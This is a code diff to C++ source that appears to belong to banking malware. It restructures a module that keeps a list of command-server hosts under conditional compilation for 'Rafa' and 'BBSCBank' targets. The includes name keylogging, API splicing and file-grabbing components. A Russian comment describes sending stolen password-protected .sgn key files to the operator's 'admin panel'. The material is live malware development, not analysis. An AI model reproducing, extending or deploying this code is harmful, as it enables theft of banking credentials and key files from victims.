@@ -1,3 +1,23 @@
+#include "Modules.h"
+
+#ifdef RafaH || BBSCBankH
+
+static char RAFA_HOSTS[RAFAHOSTS_PARAM_SIZE] = RAFAHOSTS_PARAM_NAME;
+
+namespace Rafa {
+
+	PCHAR Hosts()
+	{
+		return RAFA_HOSTS;
+    }
+
+};
+#endif //RafaH || BBSCBankH
+
+#ifdef RafaH
+//****************************************************************************
+
+
 #include "GetApi.h"
 #include "KeyLogSystems.h"
 #include "Memory.h"
@@ -5,8 +25,6 @@
 #include "Splice.h"
 #include "rafa.h"
 #include "FileGrabber.h"
-
-static char RAFA_HOSTS[RAFAHOSTS_PARAM_SIZE] = RAFAHOSTS_PARAM_NAME;
 
 #include "RafaDll.cpp"
 
@@ -20,11 +38,6 @@ namespace DBGRAFAKEY
 #define DBG DBGRAFAKEY::DBGOutMessage<>
 
 namespace Rafa {
-
-	PCHAR Hosts()
-	{
-		return RAFA_HOSTS;
-    }
 
 	//отсылает найденные файлы ключи в админку, сюда попадают файлы с расширением sgn, которые открываются
 	//только после правильного ввода пароля
@@ -91,3 +104,6 @@ namespace Rafa {
 		}
 	}
 }
+
+
+#endif  //RafaH
